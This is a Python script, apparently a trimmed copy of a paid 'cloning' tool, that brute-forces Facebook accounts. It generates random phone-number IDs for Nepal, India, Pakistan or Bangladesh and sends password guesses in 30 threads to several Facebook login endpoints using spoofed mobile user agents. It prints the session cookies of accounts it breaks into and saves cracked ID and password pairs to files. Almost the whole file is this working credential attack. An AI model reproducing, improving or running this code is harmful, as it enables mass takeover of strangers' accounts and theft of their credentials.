#created by SAMI aka Aryan chaudhary
#open source by SAMI
#github= SAMI-XD
...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/SAMI-XD/XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
os.system("clear")
print("PLZZ SPORT ME MY FB GROUP")
os.system('xdg-open https://https://www.facebook.com/manoj.gaire.142?mibextid=ZbWKwL')
...
\033[1;37m ####### ####### ###  #####  #     # #     #   
 ╔═════════════════════════════════╗
║    \033[1;37m  THANKS TO MEMBERS \033[1;37m    \033[1;35m  ║\033[1;35m
╚═════════════════════════════════╝                                    
\033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;94m[✍︎] \033[1;94mDEVELOPER : TERO BAU
\033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;93m[✍︎] \033[1;93mOWNER  : MANOJ GAIRE BAU
\033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;92m[✍︎] \033[1;92mNOTE    : ITS PAID ONLY GROUP MEMBER CAN YOUSE IT
\033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;95m[✍︎] \033[1;95mWHATSAPP    : XAINA HEHE
\033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;96m[✍︎] \033[1;96mTOOLS     : OLD ID CLONING 2004-2009 RANDOM
\033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
...
def SAMI():
    ...
    print("\033[1;35m[1] NEPAL RANDOM CLONE \n\033[1;32m[2] INDIA RANDOM CLONE \n\033[1;33m[3] PK RANDOM CLONE \n\033[1;39m[4] BD RANDOM CLONES\n")
    print(49*'=')
    aryan = input("✓CHOOSE>")
    if aryan =='1':SAMI1()
    elif aryan =='2':SAMI2()
        ...
        print("\033[1;36mSELECT CORRECT OPTION")
        SAMI()
...
def SAMI1():
	...
	os.system('clear')
	print(logo)
	print('\033[1;37m[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (6367,6377)')
	print(47*'-')
	kode = input('\033[1;35m[?] CHOOSE CODE : ')
	print(47*'-')
	limit = int(input('\033[1;36m[?] HOW TO LIMT 50000 : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	os.system("clear")
	print(logo)
	print("      \033[1;37m          CHOOSE METHOD                       ")
	print("\033[1;36m[+]==============================================")
	print("\033[1;37m[1] METHOD 1- MBASIC\n\033[1;36m[2] METHOD 2- P\n\033[1;37m[3] METHOD 3- X\n\033[1;32m[4] METHOD 4- MOBILE\n")
	print(49*'=')
	SAMIfire = input("\033[1;38m[+] [CHOOSE] :- ")
	os.system("clear")
	print(logo)
	print("   \033[1;37m             TRY SOMETHING NEW                       ")
	print("\033[1;32m[+]==============================================")
	print("\033[1;36m[+] DO YOU WANNA SHOW COKKIE & APK OF OK IDZ (Y/N) :-  ")
	print("\033[1;33m[+]==============================================")
	SAMIlovesyou = input("\033[1;37m[+] [CHOOSE] :- ")
	if SAMIlovesyou in ['y','Y','1','yes','YES','Yes']:
		SAMI_xd.append('y')
	else:
		SAMI_xd.append('n')
	print("\033[1;31m[+]==============================================")
	print("\033[1;33m[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
	print("\033[1;37m[+]==============================================")
	SAMItop = input("[+] [CHOOSE] :- ")
	if SAMItop in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	with ThreadPool(max_workers=30) as yaari:
		...
		print(logo)
		tl = str(len(user))
		print(f"\033[1;39m[+] TOTAL IDZ  : "+tl+" ")
		print(f"\033[1;35m[+] CODE CHOOSED : "+kode)
		print(f'\033[1;32m[+] METHOD CHOOSED : M{SAMIfire}')
		...
		for guru in user:
			...
			if SAMIfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif SAMIfire =='2':yaari.submit(p,uid,pwx,tl)
			elif SAMIfire =='3':yaari.submit(x,uid,pwx,tl)
			elif SAMIfire =='4':yaari.submit(mobile,uid,pwx,tl)
			else:
	...
	print('[?] Ids saved in SAMI-OK.txt,SAMI-CP.txt')
...
def SAMI2():
	...
	os.system('clear')
	print(logo)
	print('\033[1;37m[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (92317)')
	print(47*'-')
	kode = input('\033[1;35m[?] CHOOSE CODE : ')
	print(47*'-')
	limit = int(input('\033[1;36m[?] HOW TO LIMT 50000 : '))
	...
	print('[?] Ids saved in XOREY-OK.txt,SAMI-CP.txt')
	print(47*"-")
...
def SAMI3():
	...
	os.system('clear')
	print(logo)
	print(' \033[1;37m[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (9317)')
	print(47*'-')
	kode = input('\033[1;35m[?] CHOOSE CODE : ')
	print(47*'-')
	limit = int(input('\033[1;36m[?] HOW TO LIMT 50000 : '))
...
def mbasic(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[XOREY-OK🍁] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in SAMI_xd:
					print("\33[1;92m[??] \33[1;98mCOOKIES : \33[1;92m"+coki)
					
				open('/sdcard/XOREY-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[XOREY-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/SAMI-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/XOREY-CP.txt', 'a').write(cid+' | '+ps+'\n')
					break
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-XOREY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-XOREY] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'Host': 'x.facebook.com',
    'method':'POST',
    'scheme':'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-SAMI] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-XOREY🍁] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
